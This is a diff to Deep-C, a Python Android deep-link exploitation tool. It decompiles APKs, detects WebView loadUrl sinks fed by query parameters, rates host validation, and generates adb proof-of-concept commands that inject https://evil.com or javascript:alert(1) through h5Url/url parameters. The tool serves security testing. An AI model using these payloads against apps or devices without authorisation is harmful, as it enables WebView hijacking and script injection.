@@ -15,6 +15,19 @@ APKTOOL_DIR = os.path.join(OUT_DIR, "apktool")
 JADX_OUT_DIR = os.path.abspath("deepc_jadx_out")
 SRC_DIR = os.path.join(JADX_OUT_DIR, "sources")
 
+# ---------------- Validation Patterns ---------------- #
+
+STRONG_HOST_PATTERNS = [
+    r'getHost\(\)\.equals\("',
+    r'equalsIgnoreCase\("',
+]
+
+WEAK_HOST_PATTERNS = [
+    r'endsWith\("',
+    r'contains\("',
+    r'startsWith\("https://',
+    r'startsWith\("http://',
+]
 
 # ---------------- Banner ---------------- #
 
@@ -27,10 +40,8 @@ def banner():
 ██████╔╝███████╗███████╗██║          ╚██████╗
 ╚═════╝ ╚══════╝╚══════╝╚═╝           ╚═════╝
 
- Deep-C | Android Deep Link Exploitation Framework By Kishor Balan
+ Deep-C | Android Deep Link Exploitation Framework
  Decompile • Detect • Validate • Exploit
- Usage: python3 deepc.py -a <path_to_apk>  --> Should use the absolute path else JADX will fail
- Btw guys the AI thing needs some optimizations, working on it... 
 """)
 
 # ---------------- Helpers ---------------- #
@@ -42,7 +53,7 @@ def run(cmd, msg):
 def clean_dirs():
     if os.path.exists(OUT_DIR):
         shutil.rmtree(OUT_DIR)
-    os.makedirs(OUT_DIR)
+    os.makedirs(OUT_DIR, exist_ok=True)
 
 # ---------------- Decompilation ---------------- #
 
@@ -55,19 +66,19 @@ def decompile_manifest(apk):
     if not os.path.exists(manifest):
         sys.exit("[-] AndroidManifest.xml not found")
     return manifest
-    
+
 def decompile_source_with_jadx(apk):
     if os.path.exists(JADX_OUT_DIR):
         shutil.rmtree(JADX_OUT_DIR)
 
     os.makedirs(JADX_OUT_DIR, exist_ok=True)
 
-    print("[*] Decompiling APK to Java source (jadx)")
+    print("[*] Decompiling APK to Java/Kotlin source (jadx)")
     result = subprocess.run(
         ["jadx", "-d", JADX_OUT_DIR, apk],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True
+        #stdout=subprocess.PIPE,
+        #stderr=subprocess.PIPE,
+        #text=True
     )
 
     if result.stdout:
@@ -78,34 +89,19 @@ def decompile_source_with_jadx(apk):
         print("[jadx stderr]")
         print(result.stderr)
 
-    #if result.returncode != 0:
-       # sys.exit("[-] Jadx failed during decompilation")
-
-
-
+   # if result.returncode != 0:
+      #  sys.exit("[-] Jadx failed during decompilation")
 
 def verify_jadx_output():
-    """
-    Ensure jadx produced Java source files.
-    """
-    if not os.path.exists(SRC_DIR):
+    if not os.path.isdir(SRC_DIR):
         sys.exit("[-] Jadx output directory not found")
 
-    java_files = []
     for root, _, files in os.walk(SRC_DIR):
         for f in files:
-            if f.endswith(".java"):
-                java_files.append(os.path.join(root, f))
-                return  # one is enough
+            if f.endswith((".java", ".kt")):
+                return
 
-    sys.exit(
-        "[-] Jadx did not produce any Java files.\n"
-        "    Possible reasons:\n"
-        "    - APK is packed/obfuscated\n"
-        "    - Jadx failed silently\n"
-        "    - Unsupported APK format\n"
-        "    Try running: jadx InsecureShop.apk manually"
-    )
+    sys.exit("[-] Jadx ran but produced no Java/Kotlin files")
 
 # ---------------- Manifest Parsing ---------------- #
 
@@ -145,23 +141,25 @@ def extract_deeplinks(activity):
 # ---------------- Source Code Analysis ---------------- #
 
 def find_activity_source(activity):
-    name = activity.split(".")[-1] + ".java"
+    base = activity.split(".")[-1]
+    print(f"[*] Analyzing source for activity: {activity}")
+
     for root, _, files in os.walk(SRC_DIR):
-        if name in files:
-            return os.path.join(root, name)
+        for ext in (".java", ".kt"):
+            name = base + ext
+            if name in files:
+                path = os.path.join(root, name)
+                print(f"    [+] Found source file: {path}")
+                return path
+
+    print(f"    [!] Source file not found for {activity}")
     return None
 
 def extract_paths_from_code(code):
-    """
-    Supports Java + Kotlin (jadx) patterns:
-    - uri.getPath().equals("/web")
-    - StringsKt.equals$default(uri.getPath(), "/web", false, 2, null)
-    """
     paths = set()
-
     patterns = [
         r'getPath\(\)\.equals\("([^"]+)"\)',
-        r'StringsKt\.equals\$default\(\s*uri\.getPath\(\)\s*,\s*"([^"]+)"\s*,',
+        r'StringsKt\.equals\$default\(\s*uri\.getPath\(\)\s*,\s*"([^"]+)"',
         r'uri\.getPath\(\)\s*==\s*"([^"]+)"'
     ]
 
@@ -172,6 +170,9 @@ def extract_paths_from_code(code):
 
     return list(paths)
 
+def extract_query_params(code):
+    return re.findall(r'getQueryParameter\(\s*"([^"]+)"\s*\)', code)
+
 def analyze_source(path):
     if not path or not os.path.exists(path):
         return None
@@ -179,28 +180,42 @@ def analyze_source(path):
     with open(path, "r", errors="ignore") as f:
         code = f.read()
 
-    exploitable = (
+    query_params = extract_query_params(code)
+
+    direct_flow = (
         "loadUrl(" in code and
-        (
-            "getData(" in code or
-            "getIntent(" in code or
-            "getQueryParameter(" in code
-        )
+        "getQueryParameter(" in code
     )
 
-    if not exploitable:
+    override_flow = (
+        re.search(r'\w+\s*=\s*.*getQueryParameter\(', code) and
+        re.search(r'loadUrl\(\s*\w+\s*\)', code)
+    )
+
+    exploitable_flow = direct_flow or override_flow
+
+    if not exploitable_flow:
+        print("    [-] No exploitable sink flow found")
         return None
 
-    if any(x in code for x in ["endsWith(", "contains(", "matches("]):
-        confidence = "HIGH"
-    elif "getHost().equals" in code or "https://" in code:
-        confidence = "LOW"
+    strong_validation = any(re.search(p, code) for p in STRONG_HOST_PATTERNS)
+    weak_validation = any(re.search(p, code) for p in WEAK_HOST_PATTERNS)
+
+    if not strong_validation and not weak_validation:
+        level = "VULNERABLE"
+    elif weak_validation and not strong_validation:
+        level = "WEAK_VALIDATION"
     else:
-        confidence = "MEDIUM"
+        level = "SAFE"
+
+    print(f"    [+] Issue classified as: {level}")
 
     return {
-        "confidence": confidence,
+        "level": level,
         "paths": extract_paths_from_code(code),
+        "query_params": query_params,
+        "weak_validation": weak_validation,
+        "strong_validation": strong_validation,
         "code": code[:4000]
     }
 
@@ -214,8 +229,8 @@ def generate_pocs(pkg, activity, deeplink):
     base = f"{scheme}://{host}" if host else f"{scheme}://"
 
     return [
-        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?url=https://evil.com"',
-        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?url=javascript:alert(1)"',
+        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?h5Url=https://evil.com"',
+        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?h5Url=javascript:alert(1)"',
         f'adb shell am start -n {pkg}/{activity}'
     ]
 
@@ -229,9 +244,13 @@ def main():
     parser.add_argument("--exec", action="store_true")
     args = parser.parse_args()
 
+    apk_path = os.path.abspath(args.apk)
+    if not os.path.isfile(apk_path):
+        sys.exit(f"[-] APK not found: {apk_path}")
+
     clean_dirs()
-    manifest = decompile_manifest(args.apk)
-    decompile_source_with_jadx(args.apk)
+    manifest = decompile_manifest(apk_path)
+    decompile_source_with_jadx(apk_path)
     verify_jadx_output()
 
     root, package = parse_manifest(manifest)
@@ -251,7 +270,7 @@ def main():
 
             src = find_activity_source(name)
             analysis = analyze_source(src)
-            if not analysis:
+            if not analysis or analysis["level"] == "SAFE":
                 continue
 
             paths = (
@@ -260,10 +279,12 @@ def main():
                 or ["/"]
             )
 
-            print("[+] Vulnerable Activity Found")
-            print(f"    Activity   : {name}")
-            print(f"    Source     : {src}")
-            print(f"    Confidence : {analysis['confidence']}")
+            print("[+] Deep Link Issue Found")
+            print(f"    Activity     : {name}")
+            print(f"    Level        : {analysis['level']}")
+            if analysis.get("query_params"):
+                print(f"    Query Params : {', '.join(analysis['query_params'])}")
+            print(f"    Source       : {src}")
 
             for path in paths:
                 dl = deeplinks[0]
@@ -286,7 +307,10 @@ def main():
                     "activity": name,
                     "source": src,
                     "path": path,
-                    "confidence": analysis["confidence"],
+                    "level": analysis["level"],
+                    "query_params": analysis["query_params"],
+                    "weak_validation": analysis["weak_validation"],
+                    "strong_validation": analysis["strong_validation"],
                     "pocs": pocs
                 })
 
